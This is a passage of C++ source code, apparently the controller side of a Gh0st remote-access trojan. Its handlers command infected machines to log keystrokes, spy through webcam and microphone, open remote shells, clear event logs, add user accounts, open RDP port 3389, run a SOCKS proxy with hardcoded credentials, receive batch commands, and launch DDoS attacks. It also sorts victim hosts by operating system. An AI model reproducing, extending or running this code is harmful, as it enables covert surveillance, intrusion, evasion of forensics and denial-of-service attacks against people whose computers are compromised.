		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CGh0stView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnSystem() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnPlugin() 
{
	// TODO: Add your command handler code here

	if(CGh0stApp::bUsePlugin==FALSE)
	{
		MessageBox("该账号没有权限使用插件功能!请联系客服!","提示",MB_OK|MB_ICONINFORMATION);
		return;
	}

	BYTE	bToken = COMMAND_PLUGIN;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CGh0stView::OnLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CGh0stView::OnReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CGh0stView::OnShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

//选择全部....
void CGh0stView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

//取消全部.
void CGh0stView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}	
}

void CGh0stView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CGh0stView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CGh0stView::OnCleanevent()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnRenameRemark() 
{
	// TODO: Add your command handler code here

	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format("更改主机(%s)的备注", m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle = "批量更改主机备注";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}

	delete[] lpPacket;		
}


void CGh0stView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while (pos) 
	{
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));	
	}
}

void CGh0stView::OnDdosattack() 
{
	// TODO: Add your command handler code here

	static CDDOSAttackDlg *m_Attack =NULL;
	if(m_Attack==NULL)
	{
		m_Attack= new CDDOSAttackDlg;
		m_Attack->Point=this;
		m_Attack->Create(IDD_ATTACK_DIALOG,GetDesktopWindow());
	}	
	m_Attack->ShowWindow(SW_SHOW);
}

VOID CGh0stView::GetHostNums(DWORD &OnlineHost,DWORD &SelectedHost)
{
	OnlineHost = m_pListCtrl->GetItemCount();
	
	SelectedHost = 0;

	for (DWORD i=0;i<OnlineHost;i++)
		if(m_pListCtrl->GetCheck(i))
			SelectedHost++;
}


VOID CGh0stView::SiftConTextData(ClientContext *Context)
{
	DWORD HostNum = m_pListCtrl->GetItemCount();

	for (DWORD i=0;i<HostNum;i++)
	{
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
		if(pContext->m_Socket==Context->m_Socket)
			m_pListCtrl->SetCheck(i,TRUE);
	}
}

DWORD CGh0stView::SiftItemText(WORD iCount,LPSTR Text,DWORD &AllCount)
{
	
	DWORD HostNum = m_pListCtrl->GetItemCount();
	AllCount = HostNum;

	CHAR iText[200]={NULL};
	DWORD RCount =0;

	for (DWORD i=0;i<HostNum;i++)
	{
		m_pListCtrl->GetItemText(i,iCount,iText,200);
		if(strstr(iText,Text))
		{
			RCount++;
			m_pListCtrl->SetCheck(i,TRUE);
		}
		else
			m_pListCtrl->SetCheck(i,FALSE);
	}

	return RCount;
}

VOID CGh0stView::SendSiftCommand(WORD iCount,LPSTR szText)
{

	WORD nSize = strlen(szText)+2;
	
	LPBYTE	bToken = new BYTE[nSize];
	ZeroMemory(bToken,nSize);

	if(iCount == 20)
		bToken[0] = COMMNAD_SIFT_PROCESS;
	else
		bToken[0] =COMMAND_SIFT_WINTEXT;

	strcpy((CHAR *)&bToken[1],szText);
	
	DWORD HostNum = m_pListCtrl->GetItemCount();

	for (DWORD i=0;i<HostNum;i++)
	{
		m_pListCtrl->SetCheck(i,FALSE);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
		m_iocpServer->Send(pContext, bToken, nSize);
	}
	
	delete []bToken;
}

VOID CGh0stView::StopingBacthCommand()
{
	if(m_AutoBacthData)
	{
		m_AutoBacth=FALSE;
		m_AutoBacthData=NULL;
		m_BacthSize =NULL;
		delete [] m_AutoBacthData;
	}
}

VOID CGh0stView::SendAutoBacthCommand(ClientContext *Context)
{
	if(m_AutoBacth == FALSE)
		return;
	if(m_AutoBacthData==NULL)
		return;
	if(m_BacthSize==NULL)
		return;

	m_iocpServer->Send(Context, m_AutoBacthData, m_BacthSize);
	CBatchCommand::CountHost++;

}

DWORD CGh0stView::SendBatchCommand(LPVOID lpData,WORD nSize,BOOL Auto,BOOL Host)
{
	LPBYTE	bToken = new BYTE[nSize+1];
	
	ZeroMemory(bToken,nSize+1);
	
	bToken[0] = COMMNAD_BATCH_COMMAND;

	memcpy(&bToken[1],lpData,nSize);

	DWORD HostNum = m_pListCtrl->GetItemCount();
	DWORD Result=0;

	for (DWORD i=0;i<HostNum;i++)
	{
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
		if (Host)//针对选中主机
		{
			if(m_pListCtrl->GetCheck(i))
				m_iocpServer->Send(pContext, bToken, nSize);
			Result++;
		}
		else //全部主机
		{
			Result++;
			m_iocpServer->Send(pContext, bToken, nSize);
		}
	}	
	if(Auto)
	{
		m_AutoBacth = Auto;
		m_BacthSize = nSize;
		m_AutoBacthData=new BYTE[nSize+1];
		memcpy(m_AutoBacthData,bToken,nSize+1);
	}
	delete []bToken;
	return Result;
}

void CGh0stView::OnVediospy() 
{
	// TODO: Add your command handler code here
	OnWebcam();
}


void CGh0stView::OnSystemmanager() 
{
	// TODO: Add your command handler code here
	OnSystem();
}

void CGh0stView::OnSoundspy() 
{
	// TODO: Add your command handler code here
	OnAudioListen();
}


void CGh0stView::OnKetboadspy() 
{
	// TODO: Add your command handler code here
	OnKeyboard();
}

void CGh0stView::OnCommandshell() 
{
	// TODO: Add your command handler code here
	OnRemoteshell();
}

void CGh0stView::OnFilemanegers() 
{
	// TODO: Add your command handler code here
	OnFilemanager();
}



void CGh0stView::OnBatch() 
{
	// TODO: Add your command handler code here
	static CBatchCommand *m_BatchDlg =NULL;
	if(m_BatchDlg==NULL)
	{
		m_BatchDlg=new CBatchCommand;
		m_BatchDlg->Point=this;
		m_BatchDlg->Create(IDD_BTACK_DIALOG,GetDesktopWindow());
	}
	m_BatchDlg->ShowWindow(SW_SHOW);
}

void CGh0stView::OnDdos() 
{
	// TODO: Add your command handler code here
	OnDdosattack();
}


//反向选择..
void CGh0stView::OnReverse() 
{
	// TODO: Add your command handler code here
	
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		if(m_pListCtrl->GetCheck(i))
		{
			m_pListCtrl->SetCheck(i,FALSE);
			m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		}
		else
		{
			m_pListCtrl->SetCheck(i,TRUE);
			m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		}
	}

}
//选择XP 系统
void CGh0stView::OnSelectXp() 
{
	// TODO: Add your command handler code here
	CString szString;
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)
	{
		szString = m_pListCtrl->GetItemText(i,4);
		szString.MakeLower();

		if(szString.Find("xp")!=-1)
			m_pListCtrl->SetCheck(i,TRUE);
		else
			m_pListCtrl->SetCheck(i,FALSE);
	}
}

//选择服务器系统
void CGh0stView::OnSelectServer() 
{
	// TODO: Add your command handler code here
	CString szString;
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)
	{
		szString = m_pListCtrl->GetItemText(i,4);
		szString.MakeLower();
		
		if(szString.Find("2000")!=-1 || szString.Find("2003")!=-1 || szString.Find("2008")!=-1)
			m_pListCtrl->SetCheck(i,TRUE);
		else
			m_pListCtrl->SetCheck(i,FALSE);
	}
}
//选择Win 7 系统
void CGh0stView::OnSelectWin7() 
{
	// TODO: Add your command handler code here
	CString szString;
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)
	{
		szString = m_pListCtrl->GetItemText(i,4);
		szString.MakeLower();
		
		if(szString.Find("7")!=-1 || szString.Find("vista")!=-1)
			m_pListCtrl->SetCheck(i,TRUE);
		else
			m_pListCtrl->SetCheck(i,FALSE);
	}
}

void CGh0stView::OnCustomSelect() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("追加选择主机"), _T("请输入要选择的主机数量"), this);
	if (dlg.DoModal() != IDOK)   
		return;

	dlg.m_str.MakeLower();
	
	DWORD Nums = atoi(dlg.m_str.GetBuffer(0));

	if(Nums<0 || Nums >100000)
		return;

	DWORD iCount =0;
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)
	{
		if(iCount == Nums)
			return;

		if(m_pListCtrl->GetCheck(i)==FALSE)
		{
			m_pListCtrl->SetCheck(i,TRUE);
			iCount++;
		}
	}

}

void CGh0stView::OnCounthost() 
{
	// TODO: Add your command handler code here
	CString  szString;
	
	DWORD iCount =0;
	DWORD AllNums = m_pListCtrl->GetItemCount();
	
	DWORD szServer=0;
	DWORD szXp=0;
	DWORD szWin7=0;
	DWORD szVista=0;
	
	for (int i = 0; i <AllNums; i++)
	{
		if(m_pListCtrl->GetCheck(i))
			iCount++;
		szString = m_pListCtrl->GetItemText(i,4);
		szString.MakeLower();
		
		if(szString.Find("xp")!=-1)
			szXp++;
		if(szString.Find("7")!=-1)
			szWin7++;
		if(szString.Find("vista")!=-1)
			szVista++;
		if(szString.Find("2000")!=-1 || szString.Find("2003")!=-1 || szString.Find("2008")!=-1)
			szServer++;
	}
	
	szString.Format("当前在线主机: %d 台\r\n已选中主机: %d 台\r\n未选中主机: %d 台\r\n"
		"Xp: %d\r\nVista: %d\r\nWin 7: %d\r\nServer: %d\r\n",
		AllNums,iCount,AllNums-iCount,szXp,szVista,szWin7,szServer);
	
	MessageBox(szString.GetBuffer(0),"提示",MB_OK|MB_ICONINFORMATION);
}

void CGh0stView::OnOpen3389() 
{
	// TODO: Add your command handler code here
	MessageBox("近期开放","提示");
}
//紧紧保存重复主机的快照
BOOL CGh0stView::SelectRepeatHost(DWORD iCount,LPSTR szIP,LPSTR szMark,INT *CountArray)
{
	BOOL Result=FALSE;

	CHAR szMarkTemp[100]={NULL};
	CHAR szIPTemp[100]={NULL};

	WORD iArray=0;

	for (DWORD i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		if(i==iCount)
			continue;
	
		m_pListCtrl->GetItemText(i,1,szIPTemp,100);
		m_pListCtrl->GetItemText(i,12,szMarkTemp,100);

		if(strcmp(szMarkTemp,szMark)==0 && strcmp(szIPTemp,szIP)==0)
		{
			CountArray[iArray]=i;
			iArray++;

			Result = TRUE;
		}
	}
	CountArray[iArray]=-1;

	return Result;
}

VOID CGh0stView::OnClientExit()
{
	
	DWORD iCount = m_pListCtrl->GetItemCount();

	if(iCount == 0)
		return;

	for (DWORD i=0;i<iCount;i++)
	{
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
		
		BYTE	bToken = COMMAND_CLIENT_CLOSE;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));

		m_pListCtrl->DeleteItem(i);
	}

}

VOID CGh0stView::Checking()
{
	for (DWORD i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
		
		BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}

}

DWORD WINAPI CGh0stView::CheckOnlineHost(LPVOID lParam)
{
	if(lParam == NULL)
		return FALSE;

	CGh0stView *lPoint = (CGh0stView *)lParam;
	while(TRUE)
	{
		Sleep(CheckTime*3000);
		lPoint->Checking();//发送心跳包实现检测
	}

	return FALSE;
}

void CGh0stView::OnSendmessage() 
{
	// TODO: Add your command handler code here
	static CChatDialog *m_chatDlg =NULL;
	if(m_chatDlg==NULL)
	{
		m_chatDlg=new CChatDialog;
		m_chatDlg->Point=this;
		m_chatDlg->Create(IDD_CHAT_DIALOG,GetDesktopWindow());
	}
	m_chatDlg->ShowWindow(SW_SHOW);

}


void CGh0stView::Onopendaili() 
{
	// TODO: Add your command handler code here
    CInputDialog dlg;
	dlg.Init(_T("开启代理:"), _T("默认端口:1080[用户名:ben 密码:ben]"), this);
	if (dlg.DoModal() != IDOK)
		return;
	int	nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_PROXY_BEGIN;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
	
}

void CGh0stView::OnAddUser() 
{
	// TODO: Add your command handler code here
one:
CUser dlg;
char socks5info[100] = "\0";
char *a = "|";
if(dlg.DoModal() != IDOK) return;

dlg.m_net_user.MakeLower();
if (strlen(dlg.m_net_user) < 1 | strlen(dlg.m_net_pass) < 1)
{
	MessageBox(_T("请输入用户名和密码!!"), _T("错误"));
	goto one;
}
strcat(socks5info, dlg.m_net_user);
strcat(socks5info, a);
strcat(socks5info, dlg.m_net_pass);
strcat(socks5info, a);
strcat(socks5info, dlg.m_admin);
int nPacketLength = (strlen(socks5info) + 2);
LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
lpPacket[0] = COMMAND_NET_USER;
memcpy(lpPacket + 1, socks5info, nPacketLength);
SendSelectCommand(lpPacket, nPacketLength - 1);
LocalFree(lpPacket);
}
void CGh0stView::OnOpenPort() 
{
    CInputDialog dlg;
    dlg.Init(_T("开启3389:"), _T("例如端口: 3389"), this);
    if (dlg.DoModal() != IDOK)
        return;
    int nPacketLength = (dlg.m_str.GetLength() + 2);
    LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_OPEN_3389;
	char *tempurl = dlg.m_str.GetBuffer(dlg.m_str.GetLength() + 1);	//CString转换为char*
	dlg.m_str.ReleaseBuffer();
    memcpy(lpPacket + 1, tempurl, nPacketLength - 1);
    SendSelectCommand(lpPacket, nPacketLength);
    LocalFree(lpPacket);
}
